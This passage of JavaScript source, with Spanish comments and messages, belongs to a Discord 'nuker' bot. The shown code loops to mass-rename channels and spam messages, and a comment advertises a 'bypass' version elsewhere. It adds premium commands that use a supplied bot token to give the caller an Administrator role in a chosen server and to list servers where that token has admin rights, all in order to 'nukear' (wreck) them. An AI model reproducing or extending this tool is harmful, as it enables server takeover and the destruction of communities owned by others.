                                //psdta: Puedes obtener el código replicado con bypass en ZenX jeje
                                ch.setName('ʀǟɨɖɮʏռɨӽǟʝǟɮǟʐɨֆ');
                            } catch (e) {
                                console.log(e);
                            };  
                        };
                        for (const ch of channelss.values()) {
                            try {
                                enviar_msgxd(ch);
                            } catch (e) {
                                console.log(e);
                            };  
                        };
                    };
                };
                for (let index = 0; index < 50; index++) {
                    await wait_ms(10);
                    crear_canalesxdxd();
                };
            }
        };
    };
    if(msg.content === prefix_p+"admin.guild"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **admin.guild** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(!usuarios_premium.includes(msg.author.id)){
            return;
        };
        if (!config_usuarios_premium[msg.author.id].guild_id) {
            await msg.channel.send({content:`> No haz introducido ninguna ID de un servidor por lo tanto no se puede nukear.`});
            return;
        } else {
            if(!config_usuarios_premium[msg.author.id].bot_token_n){
                await msg.channel.send({content:`> No haz introducido ningún token de bot.`});
                return;
            } else {
                await msg.channel.send({content:`> Obteniendo admin en la guild seleccionada...`});
                let namev = `client${msg.author.id}`;
                namev = new Client({intents: [103423]});
                await namev.login(config_usuarios_premium[msg.author.id].bot_token_n);
                await namev.guilds.cache.get(config_usuarios_premium[msg.author.id].guild_id);
                try {
                    const rolxd = await namev.guilds.cache.get(`${config_usuarios_premium[msg.author.id].guild_id}`).roles.create({name:"xd",permissions:PermissionsBitField.Flags.Administrator}).catch(e=>{});
                    await namev.guilds.cache.get(`${config_usuarios_premium[msg.author.id].guild_id}`).members.cache.get(`${msg.author.id}`).roles.add(rolxd.id);
                    await msg.channel.send({content:`> Completado.`});
                } catch (e) {
                    msg.channel.send({content:`> No se pudo obtener administrador.`});
                }
                namev.destroy();
            }
        };
    };
    if(msg.content === prefix_p+"find.guilds"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **find.guilds** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(!usuarios_premium.includes(msg.author.id)){
            return;
        };
        if (!config_usuarios_premium[msg.author.id].guild_id) {
            await msg.channel.send({content:`> No haz introducido ninguna ID de un servidor por lo tanto no se puede nukear.`});
            return;
        } else {
            if(!config_usuarios_premium[msg.author.id].bot_token_n){
                await msg.channel.send({content:`> No haz introducido ningún token de bot.`});
                return;
            } else {
                await msg.channel.send({content:`> Buscando servidores con permisos de administardor en el token xdxd...`});
                let namev = `client${msg.author.id}`;
                namev = new Client({intents: [103423]});
                await namev.login(config_usuarios_premium[msg.author.id].bot_token_n);
                const ajskdsa = await namev.guilds.fetch();
                for (const xdsdagjfvsarjhjfsthb of ajskdsa.values()) {
                    try {
                        if(namev.guilds.cache.get(`${xdsdagjfvsarjhjfsthb.id}`).members.cache.get(`${namev.user.id}`).permissions.has(PermissionsBitField.Flags.Administrator)){
                            await msg.channel.send({content:`> El bot tiene permisos de administrador en el servidor ${xdsdagjfvsarjhjfsthb.name}`})
                        };
                    } catch (e) {
                        console.log(e)
                        await msg.channel.send({content:`> No se pudo obtener información del servidor ${xdsdagjfvsarjhjfsthb.id}`})
                    }   
                };
                await namev.destroy();
            };
        };
    };
});
client.login(bot_token);
